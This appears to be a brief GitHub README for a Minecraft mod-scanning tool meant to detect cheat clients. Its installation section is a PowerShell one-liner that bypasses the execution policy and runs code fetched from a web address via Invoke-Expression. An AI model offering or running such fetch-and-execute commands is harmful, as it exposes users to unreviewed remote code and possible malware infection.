[README.md](https://github.com/user-attachments/files/27897144/README.md)
# AZC Checker
CMD script to analyze Minecraft mods and identify potential cheat clients.

## Installation
```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-Expression (Invoke-RestMethod 'https://github.com/AZC44/AZC-Checker-V1')"
```
...
## Contacts
Discord: `aq25_`
GitHub: [AZC44](https://github.com/AZC44)
